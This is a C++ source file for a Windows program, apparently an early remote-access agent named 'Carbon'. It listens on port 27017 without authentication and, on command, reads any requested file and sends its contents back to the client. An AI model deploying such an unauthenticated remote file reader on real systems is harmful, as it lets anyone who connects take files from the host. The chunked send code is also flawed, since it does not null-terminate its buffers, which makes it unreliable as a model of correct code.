/*+===================================================================
  File:      Main.cpp

  Summary:   This is the file that contains the app's "main" method.
             Code execution will start and end here.
			 
===================================================================+*/
#ifndef WIN32_LEAN_AND_MEAN // Windows.h contains some winsock defs,
                            // so in order to avoid defining things twice we use this macro.
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include <iostream>
#include "Networking.h"
#include "Commands.h"
#pragma comment(lib, "Ws2_32.lib") // Required library for winsock
#define BUFLEN 512

int parse_command(char* sRawCommand) 
{
	/*
	* This function parses the command opcode from the raw data received from the client.
	* It assumes that the client enforces the usage format.
	*
	* param sRawCommand: char*, the raw data received from the client.
	*
	* return: int, the command opcode parsed from the parameter.
	*/
	int iCommand;
	iCommand = (int)sRawCommand[0];
	return iCommand - 48; 
}


char* parse_args(char* sRawCommand)
{
	/*
	* This function parses the arguments from the raw data received from the client.
	* It assumes that the client enforces the usage format.
	* 
	* param sRawCommand: char*, the raw data received from the client.
	* 
	* return: char*, the arguments parsed from the parameter.
	*/
	char* sArgs;
	char* sNextToken = NULL;
	strtok_s(sRawCommand, " ", &sNextToken);
	sArgs = sNextToken;
	return sArgs;
}

void send_results_to_client(SOCKET SessionSocket, char* pCommandResult, DWORD nSizeOfData)
{
	/*
	* This function makes use of networking.cpp to send a command's result to the client.
	* 
	* param SessionSocket: SOCKET, the SessionSocket to send the results over.
	* param pCommandResult: char*, the data to send over the socket.
	* param nSizeOfData: DWORD, the amount of the data to send in bytes.
	*/
	char pSendBuffer[BUFLEN];
	char* pTempCommandResult = pCommandResult;
	if (pCommandResult == NULL)
	{
		send_on_socket(SessionSocket, "ERROR! Consult Debug MSG on server.\0");
		return;
	}
	if (nSizeOfData <= BUFLEN)
	{
		send_on_socket(SessionSocket, pTempCommandResult);
	}
	else
	{
		do
		{
			memcpy(pSendBuffer, pTempCommandResult, BUFLEN);
			send_on_socket(SessionSocket, pSendBuffer);
			nSizeOfData -= BUFLEN;
			pTempCommandResult += BUFLEN;

		} while (nSizeOfData >= BUFLEN);

		if (nSizeOfData != 0)
		{
			memcpy(pSendBuffer, pTempCommandResult, nSizeOfData);
			send_on_socket(SessionSocket, pSendBuffer);
		}
	}
	return;
}

int do_command(SOCKET SessionSocket, int iCommand, char* args) 
{
	/*
	* This function handles executing the commands sent from the client,
	* and sending the output to the client.
	* 
	* param SessionSocket, SOCKET, the client socket, so we can send the results over.
	* param iCommand: int, the command opcode.
	* param args: char*, arguments for the command, if there are any.
	* 
	* return 0 if successful, 1 if an error has occured.
	*/
	char* pCommandResult;
	DWORD nSizeOfData;
	char sInvalidCommand[] = "The command you sent is invalid";
	printf("command is %d \n", iCommand);
	switch (iCommand)
	{
	case 1:
		pCommandResult = get_file_content(args, &nSizeOfData);
		send_results_to_client(SessionSocket, pCommandResult, nSizeOfData);
		free(pCommandResult);
		return 0;
	}
	send_results_to_client(SessionSocket, sInvalidCommand, strlen(sInvalidCommand));
	return 1;

}
int check_if_already_running()
{
	/*
	* This function checks if our tool is already running.
	* It does this by simply creating a mutex the first time it runs.
	* Because mutexes are freed automatically on program termination,
	* if there is no instance of carbon.exe there will be no mutex, and vice versa.
	* 
	* return: 0 if no instance is found, 1 if an instance is found.
	*/
	CreateMutexA(0, FALSE, "Local\\Carbon");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return 1;
	}
	return 0;
}


int command_loop()
{
	/*
	* This function is our main command loop.
	* It handles calling all of the other functions needed to 
	* constantly recieve and execute commands.
	* 
	* return: 0
	*/
	int iCommand = 0;
	char* recvbuf;
	char* pCommandResult;
	char* sArgs;
	int iResult;
	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET SessionSocket;
	ListenSocket = startup_server("27017");

	do{
		SessionSocket = wait_for_session(ListenSocket);
		recvbuf = receive_on_socket(SessionSocket);
		iCommand = parse_command(recvbuf);
		sArgs = parse_args(recvbuf);
		iResult = do_command(SessionSocket ,iCommand, sArgs);
		iResult = shutdown(SessionSocket, SD_SEND);


	} while (iCommand > 0);
	std::cout << "done!";
	return 0;
}

int main()
{
	if (!check_if_already_running())
	{
		return command_loop();
	}
	else
	{
		return -1;
	}
}